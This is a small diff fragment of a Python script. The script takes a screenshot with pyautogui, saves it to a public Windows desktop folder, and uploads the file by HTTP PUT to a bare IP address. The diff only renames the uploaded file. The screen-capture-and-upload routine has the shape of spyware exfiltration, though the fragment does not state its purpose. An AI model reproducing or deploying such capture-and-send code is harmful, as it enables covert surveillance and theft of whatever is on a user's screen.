@@ -47,7 +47,7 @@ time.sleep(2)
 im1 = pag.screenshot()
 im2 = pag.screenshot(r'C:\Users\Public\Desktop\my_screenshot.png')
 files = open(r'C:\Users\Public\Desktop\my_screenshot.png', 'rb')
-r = requests.put('http://18.228.80.130/test.png', data=files)
+r = requests.put('http://18.228.80.130/test1.png', data=files)
 
 print(r.content)
 
